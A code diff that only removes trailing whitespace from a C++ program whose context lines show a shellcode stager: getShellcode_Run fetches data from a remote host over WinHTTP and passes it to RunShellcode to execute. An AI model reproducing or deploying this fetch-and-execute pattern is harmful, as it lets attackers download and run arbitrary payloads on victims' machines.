@@ -118,7 +118,7 @@ void getShellcode_Run(wchar_t* whost, DWORD port, wchar_t* wresource) {
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
 
- 
+
     // Specify an HTTP server.
     if (hSession)
         hConnect = WinHttpConnect(hSession, whost,
@@ -174,7 +174,7 @@ void getShellcode_Run(wchar_t* whost, DWORD port, wchar_t* wresource) {
                     dwSize, &dwDownloaded))
                     printf("Error %u in WinHttpReadData.\n", GetLastError());
                 else {
-                    
+
                     // Run the shellcode
                     RunShellcode(pszOutBuffer, dwSize + 1);
 
@@ -212,14 +212,14 @@ int main(int argc, char** argv) {
     const size_t cSize1 = strlen(host) + 1;
     wchar_t* whost = new wchar_t[cSize1];
     mbstowcs(whost, host, cSize1);
-    
-  
+
+
     const size_t cSize2 = strlen(resource) + 1;
     wchar_t* wresource = new wchar_t[cSize2];
     mbstowcs(wresource, resource, cSize2);
 
     getShellcode_Run(whost, port, wresource);
-    
+
     return 0;
 
 }
